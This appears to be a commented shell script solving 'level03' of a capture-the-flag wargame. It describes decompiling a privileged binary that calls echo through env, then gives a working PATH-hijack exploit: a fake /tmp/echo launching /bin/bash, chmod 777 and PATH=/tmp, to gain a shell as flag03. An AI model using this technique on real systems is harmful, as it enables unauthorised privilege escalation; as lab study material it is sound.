#after looking up inside level03 with a decompiler (https://dogbolt.org/), we can see multiple thing:
# (1) - the program upgrade his permission with 'setresgid' and 'setresuid'
# (2) - it use the 'system' function to use echo
# (3) - the path to echo in the 'system' function in seek in the env (/usr/bin/env)

# seems that the only place where we can mkdir / touch is in tmp
# create a false echo because we saw that level03 try to use system on echo from /usr/bin/env (2)
# the c program will lauch a bash session as flag03 so we will be flag03 until we logout (1)
cat > /tmp/echo << 'EOF'
#!/bin/bash
/bin/bash
EOF

# change permission to have free execution everywhere
chmod 777 /tmp/echo

# replace env $PATH by our exploit path
PATH=/tmp

#then execute, the echo in use will be the false one we created
./level03